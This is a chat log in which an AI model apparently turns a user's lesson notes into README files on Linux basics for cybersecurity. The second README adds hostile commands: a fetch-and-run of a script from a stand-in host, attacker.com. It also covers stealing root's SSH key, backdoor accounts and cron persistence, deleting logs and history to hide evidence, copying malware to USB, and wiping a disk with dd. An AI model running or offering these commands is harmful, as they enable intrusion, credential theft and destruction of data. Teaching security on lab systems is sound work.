
🐧 Linux Basics for Cybersecurity — Complete Notes
A structured and beginner-friendly guide for hackers, pentesters & cybersecurity learners.
⏩ 0:00 — Introduction
Linux is the foundation of cybersecurity. Every cybersecurity tool (Metasploit, Nmap, Wireshark CLI, Hydra, Nikto, etc.) works best on Linux-based systems.
Why Linux matters for cybersecurity:
* Open-source (full transparency)
* Powerful command-line tools
* Used in servers, cloud, IoT, devops, hacking labs
* Faster automation & scripting
* Gives low-level control over the system
⏩ 1:13 — FREE HACKING LAB (Linux)
To practice safely, you must use a virtual environment.
✔ Recommended Free Labs
PlatformWhat You GetWhy Use It?Kali Linux VM (VirtualBox / VMware)Full pentesting OSIndustry-standard hacking distroParrot OS Home/Security EditionLightweight security OSGood for low-spec laptopsUbuntu + Security ToolsCustom setupBest for beginnersTryHackMe (Free Rooms)Online virtual labsNo installation neededHackTheBox AcademyGuided cybersecurity labsGreat for structured learning
⚠ Always practice inside labs — never on real systems.
⏩ 2:40 — What is Linux?
Linux = Open-source operating system like Windows/macOS but more powerful for developers & hackers.
🧩 Key Linux Concepts
* Kernel → Heart of Linux (manages hardware)
* Shell → Interface between user & OS
* Terminal → Where you type commands
* File System → Everything is a file (/home, /etc, /bin, /root)
🏗 Linux File-System Hierarchy (Important!)

/
├── home       (user files)
├── root       (root user home)
├── etc        (config files)
├── bin        (basic commands)
├── usr        (user programs)
├── var        (logs, cached data)
└── opt        (optional software)
⏩ 5:22 — Introducing the Linux Terminal
The terminal is where real hacking starts. It's faster and more powerful than GUI.
Why hackers prefer the terminal?
* Run powerful tools (Nmap, Hydra, Gobuster, Metasploit)
* Automate with scripts
* Access system internals
* Control permissions & processes
Shortcut: Ctrl + Alt + T → Open Terminal (Ubuntu/Kali)
⏩ 6:11 — Linux Command: pwd
pwd = Print Working Directory
Shows the current directory you are in.
Example:

pwd
Output:

/home/atul
Useful when you're navigating deeply inside folders and forget where you are.
⏩ 6:55 — Linux Command: ls
ls = List files & directories
Common uses

ls           # list items
ls -l        # list with details (permissions, size)
ls -a        # show hidden files
ls -lh       # human readable sizes
Example Output:

drwxr-xr-x Documents
-rw-r--r-- notes.txt
Why it's important in hacking: You constantly inspect directories while locating configs, keys, scripts, logs, etc.
⏩ 7:33 — Linux Command: cd
cd = Change Directory
Basic navigation

cd foldername       # move inside folder
cd ..               # go back one directory
cd /etc             # absolute path
cd ~                # go to home directory
cd /                # go to root
Example

cd /var/log
Used heavily in cybersecurity while exploring important directories like:
* /etc/passwd
* /var/log/auth.log
* /home/user/
* /tmp/ (attacker-controlled files)
⏩ 10:01 — Test Your Skills (Self-Practice Tasks)
Try these without looking at answers:
✔ Beginner Tasks
1. Use pwd to check your current path.
2. Use ls -la and identify hidden files.
3. Navigate:
   * /home
   * then /etc
   * then back to /home.
✔ Medium Tasks
1. Create a folder cyberlab and move inside it.
2. Create a file notes.txt.
3. Display all items in long format.
✔ Pro Tasks (For Hackers)
1. Locate the file /etc/passwd using only navigation.
2. Navigate to /var/log and find auth.log.
3. List all directories where logs are stored.
⭐ Final Summary
This module teaches:
* What Linux is
* How the terminal works
* Essential navigation commands (pwd, ls, cd)
* Hands-on Linux practice for cybersecurity
* How to build your own hacking lab
These are core skills every hacker must master before learning Nmap, Wireshark, Metasploit, Burp Suite, etc...dont add time stamps and make a general notes..dont change content anyways.....and make me a readme.md give me the marking code

Show more
markdown
# 🐧 Linux Basics for Cybersecurity — Complete Notes

A structured and beginner-friendly guide for hackers, pentesters & cybersecurity learners.

---

## Introduction

Linux is the foundation of cybersecurity. Every cybersecurity tool (Metasploit, Nmap, Wireshark CLI, Hydra, Nikto, etc.) works best on Linux-based systems.

### Why Linux matters for cybersecurity:

- Open-source (full transparency)
- Powerful command-line tools
- Used in servers, cloud, IoT, devops, hacking labs
- Faster automation & scripting
- Gives low-level control over the system

---

## FREE HACKING LAB (Linux)

To practice safely, you must use a virtual environment.

### ✔ Recommended Free Labs

| Platform | What You Get | Why Use It? |
|----------|--------------|-------------|
| Kali Linux VM (VirtualBox / VMware) | Full pentesting OS | Industry-standard hacking distro |
| Parrot OS Home/Security Edition | Lightweight security OS | Good for low-spec laptops |
| Ubuntu + Security Tools | Custom setup | Best for beginners |
| TryHackMe (Free Rooms) | Online virtual labs | No installation needed |
| HackTheBox Academy | Guided cybersecurity labs | Great for structured learning |

⚠ **Always practice inside labs — never on real systems.**

---

## What is Linux?

Linux = Open-source operating system like Windows/macOS but more powerful for developers & hackers.

### 🧩 Key Linux Concepts

- **Kernel** → Heart of Linux (manages hardware)
- **Shell** → Interface between user & OS
- **Terminal** → Where you type commands
- **File System** → Everything is a file (`/home`, `/etc`, `/bin`, `/root`)

### 🏗 Linux File-System Hierarchy (Important!)
```
/
├── home       (user files)
├── root       (root user home)
├── etc        (config files)
├── bin        (basic commands)
├── usr        (user programs)
├── var        (logs, cached data)
└── opt        (optional software)
```

---

## Introducing the Linux Terminal

The terminal is where real hacking starts. It's faster and more powerful than GUI.

### Why hackers prefer the terminal?

- Run powerful tools (Nmap, Hydra, Gobuster, Metasploit)
- Automate with scripts
- Access system internals
- Control permissions & processes

**Shortcut:** `Ctrl + Alt + T` → Open Terminal (Ubuntu/Kali)

---

## Linux Command: `pwd`

`pwd` = Print Working Directory

Shows the current directory you are in.

**Example:**
```bash
pwd
```

**Output:**
```
/home/atul
```

Useful when you're navigating deeply inside folders and forget where you are.

---

## Linux Command: `ls`

`ls` = List files & directories

### Common uses
```bash
ls           # list items
ls -l        # list with details (permissions, size)
ls -a        # show hidden files
ls -lh       # human readable sizes
```

**Example Output:**
```
drwxr-xr-x Documents
-rw-r--r-- notes.txt
```

**Why it's important in hacking:** You constantly inspect directories while locating configs, keys, scripts, logs, etc.

---

## Linux Command: `cd`

`cd` = Change Directory

### Basic navigation
```bash
cd foldername       # move inside folder
cd ..               # go back one directory
cd /etc             # absolute path
cd ~                # go to home directory
cd /                # go to root
```

**Example:**
```bash
cd /var/log
```

Used heavily in cybersecurity while exploring important directories like:

- `/etc/passwd`
- `/var/log/auth.log`
- `/home/user/`
- `/tmp/` (attacker-controlled files)

---

## Test Your Skills (Self-Practice Tasks)

Try these without looking at answers:

### ✔ Beginner Tasks

1. Use `pwd` to check your current path.
2. Use `ls -la` and identify hidden files.
3. Navigate:
   - `/home`
   - then `/etc`
   - then back to `/home`.

### ✔ Medium Tasks

1. Create a folder `cyberlab` and move inside it.
2. Create a file `notes.txt`.
3. Display all items in long format.

### ✔ Pro Tasks (For Hackers)

1. Locate the file `/etc/passwd` using only navigation.
2. Navigate to `/var/log` and find `auth.log`.
3. List all directories where logs are stored.

---

## ⭐ Final Summary

This module teaches:

- What Linux is
- How the terminal works
- Essential navigation commands (`pwd`, `ls`, `cd`)
- Hands-on Linux practice for cybersecurity
- How to build your own hacking lab

**These are core skills every hacker must master before learning Nmap, Wireshark, Metasploit, Burp Suite, etc.**

---

## 📚 Additional Resources

- [Linux Journey](https://linuxjourney.com/)
- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/)
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [TryHackMe: Linux Fundamentals](https://tryhackme.com/)

---

## 🤝 Contributing

Feel free to contribute by submitting pull requests or opening issues for improvements.

---

## 📝 License

This guide is open-source and available for educational purposes.

---

**Happy Hacking! 🚀**
⏩  NEW COMMAND: whoami? 2:02   ⏩  10 second review 2:28   ⏩  the ROOT of the File System 2:45   ⏩  NEW COMMAND: clear 3:03   ⏩  EVERYTHING is a file!! 3:40   ⏩  /bin 4:49   ⏩  NEW COMMAND: cat 5:43   ⏩  NEW COMMAND: cp 7:12   ⏩  NEW COMMAND: rm 7:25   ⏩  i DELETED a command!!! 8:48   ⏩  /sbin 9:27   ⏩  NEW COMMAND: adduser 10:11 ⏩  /usr  11:32 ⏩  NEW COMMAND: which 12:47 ⏩  /boot 12:52 ⏩  /var 12:58 ⏩  /tmp 13:04 ⏩  /lib 13:12 ⏩  /home 13:40 ⏩  /root 14:10 ⏩  /dev 15:33 ⏩  /etc 17:11 ⏩  /mnt and /media  19:24 ⏩  CHALLENGE...actually i m studying linux for cybersecurity so make notes for me in readme.md file which i will paste in my repo for further revisions

markdown
# 🐧 Linux File System & Essential Commands for Cybersecurity

A comprehensive guide to understanding Linux file system structure and critical commands for penetration testing and security research.

---

## Linux Command: `whoami`

`whoami` = Displays the current logged-in username

**Example:**
```bash
whoami
```

**Output:**
```
kali
```

**Why it matters in cybersecurity:**
- Verify privilege level after exploitation
- Check if you're running as root or regular user
- Essential during privilege escalation attempts
- First command to run after gaining shell access

---

## 10 Second Review

Quick recap of previous commands:
```bash
pwd       # Print Working Directory
ls        # List files and directories
cd        # Change Directory
whoami    # Current user identity
```

These four commands form the foundation of Linux navigation and reconnaissance.

---

## The ROOT of the File System

The Linux file system starts at `/` (root directory).

**Key concept:** Everything in Linux branches from `/`
```
/          ← Root (not to be confused with /root user home)
```

**Navigate to root:**
```bash
cd /
ls
```

This shows all top-level directories in the system.

---

## Linux Command: `clear`

`clear` = Clears the terminal screen

**Usage:**
```bash
clear
```

**Shortcut:** `Ctrl + L` (faster alternative)

**Why hackers use it:**
- Clean workspace during long hacking sessions
- Hide previous commands when screensharing
- Improve focus and readability
- Remove clutter during reconnaissance

---

## EVERYTHING is a File!

**Core Linux Philosophy:** In Linux, everything is treated as a file.

This includes:
- Regular files (documents, scripts)
- Directories (special files containing other files)
- Hardware devices (keyboard, mouse, hard drive)
- Processes
- Network sockets

**Example:**
```bash
ls /dev    # Shows hardware devices as files
```

**Cybersecurity implication:** Understanding this concept helps in:
- Device exploitation
- File descriptor manipulation
- Process injection
- Log analysis

---

## `/bin` Directory

`/bin` = Essential user command binaries (programs)

**Contains:** Basic commands needed for system operation

**Common binaries in `/bin`:**
```bash
ls /bin

# Examples:
cat, cp, ls, mv, rm, bash, echo, grep, etc.
```

**List all available commands:**
```bash
ls /bin
ls /bin | wc -l    # Count total commands
```

**Cybersecurity relevance:**
- Contains tools used in most exploitation scripts
- Target for malware that replaces system binaries
- Essential for understanding command availability in restricted shells

---

## Linux Command: `cat`

`cat` = Concatenate and display file contents

**Basic usage:**
```bash
cat filename.txt              # Display file content
cat file1.txt file2.txt       # Display multiple files
cat file.txt | grep "password"  # Search within file
```

**Advanced usage:**
```bash
cat /etc/passwd               # View user accounts
cat /var/log/auth.log         # View authentication logs
cat /etc/shadow               # View password hashes (requires root)
```

**Cybersecurity applications:**
- Read configuration files
- Extract credentials from logs
- View password hashes
- Analyze sensitive files during post-exploitation
- Read flag files in CTF challenges

---

## Linux Command: `cp`

`cp` = Copy files and directories

**Syntax:**
```bash
cp source destination

# Examples:
cp file.txt /tmp/              # Copy to /tmp
cp file.txt backup.txt         # Create backup
cp -r folder/ /backup/         # Copy directory recursively
```

**Common flags:**
```bash
cp -r    # Copy directories recursively
cp -v    # Verbose (show what's being copied)
cp -i    # Interactive (prompt before overwrite)
```

**Hacking use cases:**
- Backup files before modification
- Copy exploit scripts to target directories
- Duplicate configuration files before tampering
- Exfiltrate data to accessible locations

---

## Linux Command: `rm`

`rm` = Remove/delete files and directories

**Basic usage:**
```bash
rm file.txt                    # Delete file
rm -r folder/                  # Delete directory recursively
rm -f file.txt                 # Force delete (no prompt)
rm -rf folder/                 # Force delete directory
```

**⚠️ DANGER ZONE:**
```bash
rm -rf /    # NEVER RUN THIS! Deletes entire system
rm -rf /*   # Equally destructive
```

**Safe practices:**
```bash
rm -i file.txt    # Interactive mode (asks confirmation)
```

**Cybersecurity relevance:**
- Delete evidence and logs after exploitation
- Remove malware artifacts
- Clear temporary files
- Anti-forensics technique
- Clean up after penetration testing

---

## I DELETED a Command!!!

**What happens if you accidentally delete a system command?**

Example: Deleting `ls` command
```bash
sudo rm /bin/ls
```

**Problem:** You can no longer use `ls` to list files!

**Solutions:**

1. **Use alternative commands:**
```bash
   echo *           # List files (bash built-in)
   find . -maxdepth 1  # List current directory
```

2. **Restore from backup or reinstall:**
```bash
   sudo apt install --reinstall coreutils   # Debian/Ubuntu
   sudo yum reinstall coreutils             # RedHat/CentOS
```

**Lesson for hackers:**
- Always backup critical binaries before modification
- Know alternative methods if tools are missing
- Understand system recovery techniques
- Practice on VMs, not production systems

---

## `/sbin` Directory

`/sbin` = System binaries (superuser/root commands)

**Contains:** Administrative and system maintenance programs

**Common binaries:**
```bash
ls /sbin

# Examples:
iptables, fdisk, ifconfig, reboot, shutdown, etc.
```

**Key difference from `/bin`:**
- `/bin` = Commands for all users
- `/sbin` = Commands for system administrators (root)

**Access:**
```bash
/sbin/iptables -L     # View firewall rules
/sbin/ifconfig        # Network configuration
```

**Cybersecurity importance:**
- Firewall manipulation
- Network configuration changes
- System-level attacks
- Privilege escalation targets

---

## Linux Command: `adduser`

`adduser` = Create new user accounts

**Syntax:**
```bash
sudo adduser username
```

**Example:**
```bash
sudo adduser hacker
# Follow prompts: password, full name, etc.
```

**View created user:**
```bash
cat /etc/passwd | grep hacker
```

**Related commands:**
```bash
sudo userdel username       # Delete user
sudo usermod -aG sudo user  # Add user to sudo group
```

**Hacking applications:**
- Create backdoor user accounts
- Persistence mechanism after exploitation
- Privilege escalation via sudo group addition
- Establish long-term access to compromised systems

---

## `/usr` Directory

`/usr` = User programs and data

**Structure:**
```
/usr
├── bin         (User commands and applications)
├── sbin        (System administration binaries)
├── lib         (Libraries for /usr/bin and /usr/sbin)
├── local       (Locally installed software)
└── share       (Shared data, documentation, icons)
```

**Key subdirectories:**
```bash
/usr/bin        # Most user commands (python, gcc, nmap, etc.)
/usr/sbin       # More system admin tools
/usr/local/bin  # Manually installed programs
```

**Check installed tools:**
```bash
ls /usr/bin | grep nmap
ls /usr/bin | grep metasploit
```

**Cybersecurity relevance:**
- Location of most hacking tools (nmap, nikto, sqlmap)
- Common installation directory for custom exploits
- Contains compilers and interpreters for exploit development

---

## Linux Command: `which`

`which` = Locate a command's executable file

**Usage:**
```bash
which python
which nmap
which bash
```

**Example output:**
```bash
which python
# Output: /usr/bin/python

which ls
# Output: /bin/ls
```

**Why it's useful:**
- Verify if a tool is installed
- Find exact path of commands
- Detect command hijacking
- Identify which binary is executed when multiple versions exist

**Cybersecurity application:**
```bash
which nc          # Find netcat location
which gcc         # Check if compiler is available
which sudo        # Verify sudo binary path
```

---

## `/boot` Directory

`/boot` = Boot loader files and kernel

**Contains:**
- Linux kernel
- Initial RAM disk (initrd)
- GRUB bootloader configuration

**Example contents:**
```bash
ls /boot

# Common files:
vmlinuz        # Linux kernel
initrd.img     # Initial ramdisk
grub/          # Bootloader config
```

**Cybersecurity relevance:**
- Bootkit malware targets this directory
- Kernel exploitation
- Secure boot bypass techniques
- Persistence via bootloader modification

---

## `/var` Directory

`/var` = Variable data (logs, caches, temporary files)

**Important subdirectories:**
```bash
/var/log        # System and application logs
/var/tmp        # Temporary files (survives reboot)
/var/www        # Web server files (Apache, Nginx)
/var/mail       # Email storage
/var/spool      # Print queues, cron jobs
```

**Critical files for hackers:**
```bash
cat /var/log/auth.log       # Authentication attempts
cat /var/log/apache2/access.log  # Web server access
cat /var/log/syslog         # System logs
```

**Cybersecurity importance:**
- Log analysis and forensics
- Web application file locations
- Finding evidence of attacks
- Planting webshells in `/var/www`
- Clearing tracks by deleting logs

---

## `/tmp` Directory

`/tmp` = Temporary files (cleared on reboot)

**Characteristics:**
- World-writable (anyone can write here)
- Automatically cleared on system reboot
- No execution restrictions by default (sometimes)

**Usage:**
```bash
cd /tmp
touch testfile
ls
```

**Cybersecurity gold mine:**
- Upload malicious payloads here
- Compile exploits in `/tmp`
- Store extracted data before exfiltration
- Drop reverse shells
- Common location for attacker scripts

**Example hacking workflow:**
```bash
cd /tmp
wget http://attacker.com/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

**⚠️ Defense tip:** Monitor `/tmp` for suspicious executables

---

## `/lib` Directory

`/lib` = Shared libraries (like DLLs in Windows)

**Contains:**
- Essential system libraries
- Kernel modules

**Example:**
```bash
ls /lib
ls /lib/modules/    # Kernel modules
```

**Related directories:**
```bash
/lib        # 32-bit libraries
/lib64      # 64-bit libraries
```

**Cybersecurity relevance:**
- Library injection attacks
- LD_PRELOAD exploitation
- Rootkit installation via library replacement
- Shared object hijacking

---

## `/home` Directory

`/home` = User home directories

**Structure:**
```bash
/home/user1
/home/user2
/home/kali
```

**Contents of a user's home:**
```bash
ls /home/kali

# Common directories:
Desktop/
Documents/
Downloads/
Pictures/
```

**Navigate to your home:**
```bash
cd ~
cd $HOME
cd /home/username
```

**Cybersecurity importance:**
- SSH keys stored in `~/.ssh/`
- Bash history in `~/.bash_history`
- Browser data and saved passwords
- Configuration files (`.bashrc`, `.profile`)
- User-specific sensitive data

**Post-exploitation targets:**
```bash
cat ~/.ssh/id_rsa           # Private SSH key
cat ~/.bash_history         # Command history
cat ~/.mysql_history        # MySQL command history
```

---

## `/root` Directory

`/root` = Root user's home directory (NOT the same as `/`)

**Key differences:**
```
/       → Root of file system (accessible to all)
/root   → Root user's home directory (requires root access)
```

**Access:**
```bash
sudo su          # Switch to root
cd /root
ls
```

**Common contents:**
```bash
/root/.ssh/             # Root's SSH keys
/root/.bash_history     # Root's command history
/root/scripts/          # Admin scripts
```

**Cybersecurity holy grail:**
- Root user's SSH keys for lateral movement
- Admin scripts with hardcoded credentials
- Root command history revealing sensitive operations
- Configuration files with elevated privileges

**Example post-exploitation:**
```bash
sudo cat /root/.bash_history    # See what root has been doing
sudo cat /root/.ssh/id_rsa      # Steal root's SSH key
```

---

## `/dev` Directory

`/dev` = Device files (hardware represented as files)

**Remember:** Everything is a file in Linux!

**Common devices:**
```bash
ls /dev

# Examples:
/dev/sda        # First hard drive
/dev/sda1       # First partition
/dev/null       # Black hole (discards all input)
/dev/zero       # Produces infinite zeros
/dev/random     # Random number generator
/dev/tty        # Terminal devices
```

**Practical examples:**
```bash
# Discard output (hide evidence):
command > /dev/null 2>&1

# Generate random data:
head -c 16 /dev/urandom | base64

# Check disk devices:
ls /dev/sd*
```

**Cybersecurity applications:**
- **Data destruction:**
```bash
  dd if=/dev/zero of=/dev/sda    # Wipe disk (DANGEROUS!)
```

- **Hiding command output:**
```bash
  nmap target > /dev/null        # Silent scan
```

- **Random password generation:**
```bash
  tr -dc A-Za-z0-9 </dev/urandom | head -c 16
```

- **Direct hardware access:**
```bash
  cat /dev/sda | grep password   # Search raw disk
```

---

## `/etc` Directory

`/etc` = Configuration files (et cetera)

**The most important directory for hackers!**

**Critical files:**
```bash
/etc/passwd             # User account information
/etc/shadow             # Password hashes (requires root)
/etc/group              # Group information
/etc/hosts              # Hostname to IP mapping
/etc/hostname           # System hostname
/etc/resolv.conf        # DNS configuration
/etc/ssh/sshd_config    # SSH server configuration
/etc/crontab            # Scheduled tasks
/etc/sudoers            # Sudo permissions
```

**View user accounts:**
```bash
cat /etc/passwd

# Format:
username:x:UID:GID:comment:home:shell
```

**View password hashes (requires root):**
```bash
sudo cat /etc/shadow

# Format:
username:$hash$:lastchange:min:max:warn:inactive:expire
```

**Network configuration:**
```bash
cat /etc/hosts          # Local DNS
cat /etc/resolv.conf    # DNS servers
```

**Persistence via cron:**
```bash
cat /etc/crontab        # System-wide cron jobs
ls /etc/cron.d/         # Additional cron configurations
```

**SSH hardening check:**
```bash
cat /etc/ssh/sshd_config | grep PermitRootLogin
cat /etc/ssh/sshd_config | grep PasswordAuthentication
```

**Cybersecurity gold mine:**
- Extract user information for brute force attacks
- Crack password hashes from `/etc/shadow`
- Modify `/etc/hosts` for DNS poisoning
- Add backdoor cron jobs for persistence
- Check sudo permissions for privilege escalation
- Analyze SSH configuration for weaknesses

---

## `/mnt` and `/media` Directories

### `/mnt` = Mount point for temporary file systems

**Usage:**
- Manually mounted drives
- Network shares
- Temporary storage devices

**Example:**
```bash
sudo mount /dev/sdb1 /mnt
ls /mnt
sudo umount /mnt
```

### `/media` = Automatically mounted removable media

**Usage:**
- USB drives
- CD/DVD drives
- External hard drives

**Example:**
```bash
ls /media/username/USB_DRIVE
```

**Cybersecurity applications:**
- **Data exfiltration:**
```bash
  cp sensitive_data.zip /media/usb/
```

- **Malware propagation:**
```bash
  cp malware.sh /media/usb/autorun.sh
```

- **Forensics:**
```bash
  sudo mount -o ro /dev/sdb1 /mnt    # Read-only mount
```

- **Network share exploitation:**
```bash
  sudo mount -t cifs //target/share /mnt -o username=admin
```

---

## CHALLENGE: Test Your Linux File System Knowledge

### Level 1: Beginner Reconnaissance

1. Display your current username
2. Navigate to the root directory and list all contents
3. Find the location of the `python` command
4. View the contents of `/etc/passwd`
5. List all binaries in `/bin` that start with 'c'

### Level 2: Intermediate Exploration

1. Create a new user called "pentest" (requires sudo)
2. Copy `/etc/passwd` to `/tmp/` as a backup
3. Count how many users exist on the system (hint: use `wc -l`)
4. Find your SSH configuration file location
5. List all log files in `/var/log/`
6. Display the first 10 lines of `/var/log/syslog` (use `head`)

### Level 3: Advanced Hacking Simulation (Practice Lab Only!)

1. Navigate to `/tmp` and create a file called `exploit.sh`
2. Write a simple bash script that displays "Hacked!" (use `echo`)
3. Make the script executable (use `chmod +x`)
4. Execute your script
5. View the command history (hint: `~/.bash_history`)
6. Find all SUID binaries on the system:
```bash
   find / -perm -4000 2>/dev/null
```
7. Check which users can run sudo:
```bash
   cat /etc/sudoers
```
8. Clear all evidence of your commands (clear history and delete files)

### Level 4: Professional Penetration Tester

1. Identify all network interfaces using files in `/dev`
2. Create a persistence mechanism using `/etc/crontab` (comment-only, don't actually execute)
3. Find all world-writable directories:
```bash
   find / -type d -perm -002 2>/dev/null
```
4. Analyze `/var/log/auth.log` for failed login attempts
5. Mount a USB device to `/mnt` and list its contents
6. Extract all unique usernames from `/etc/passwd`:
```bash
   cut -d: -f1 /etc/passwd
```

---

## File System Quick Reference Card

| Directory | Purpose | Hacker Interest Level |
|-----------|---------|----------------------|
| `/` | Root of file system | Medium |
| `/bin` | Essential commands | High |
| `/sbin` | System administration | High |
| `/usr` | User programs | Very High |
| `/boot` | Boot files | Medium |
| `/var` | Variable data, logs | Very High |
| `/tmp` | Temporary files | Very High |
| `/lib` | System libraries | Medium |
| `/home` | User home directories | Very High |
| `/root` | Root user home | Critical |
| `/dev` | Device files | High |
| `/etc` | Configuration files | Critical |
| `/mnt` | Manual mount points | Medium |
| `/media` | Removable media | Medium |

---

## Essential Commands Summary
```bash
# Navigation & Information
pwd                    # Print working directory
ls                     # List files
cd                     # Change directory
whoami                 # Current user
which [command]        # Locate command path
clear                  # Clear terminal

# File Operations
cat [file]             # Display file contents
cp [src] [dest]        # Copy files
rm [file]              # Remove files
rm -rf [dir]           # Remove directory recursively

# User Management
sudo adduser [name]    # Create new user
sudo userdel [name]    # Delete user

# System
/bin                   # User binaries
/sbin                  # System binaries
/etc/passwd            # User accounts
/etc/shadow            # Password hashes
/var/log               # System logs
```

---

## Pro Tips for Cybersecurity Learners

### 1. **Always work in a virtual lab**
   - Use Kali Linux, Parrot OS, or Ubuntu VM
   - Never practice on production systems
   - TryHackMe and HackTheBox for safe practice

### 2. **Master these directories first**
   - `/etc` - Configuration and user data
   - `/var/log` - Logs and evidence
   - `/tmp` - Playground for exploits
   - `/home` - User sensitive data
   - `/root` - Ultimate target

### 3. **Learn to chain commands**
```bash
   cat /etc/passwd | grep bash | cut -d: -f1
```

### 4. **Understand file permissions**
```bash
   ls -la
   # drwxr-xr-x = directory, read-write-execute permissions
```

### 5. **Practice daily reconnaissance**
   - `whoami` - Who am I?
   - `pwd` - Where am I?
   - `ls -la` - What's here?
   - `cat /etc/passwd` - Who else is here?
   - `sudo -l` - What can I do?

---

## Next Steps in Your Cybersecurity Journey

After mastering these fundamentals, proceed to:

1. **File Permissions** (chmod, chown, SUID, SGID)
2. **Process Management** (ps, top, kill)
3. **Network Commands** (netstat, ss, ip, ifconfig)
4. **Text Processing** (grep, sed, awk, cut)
5. **Bash Scripting** (Automation)
6. **Tool Mastery** (Nmap, Metasploit, Burp Suite)

---

## Resources for Further Learning

- **TryHackMe:** Linux Fundamentals rooms
- **HackTheBox:** Linux privilege escalation machines
- **OverTheWire:** Bandit wargames
- **Linux Journey:** Free interactive tutorials
- **ExplainShell:** Understand any command (explainshell.com)

---

## ⚠️ Legal Disclaimer

**These notes are for educational purposes only.**

- Only practice in authorized environments
- Never attack systems without permission
- Unauthorized access is illegal
- Use knowledge ethically and responsibly

---

**Stay curious, stay ethical, keep hacking! 🚀🔒**







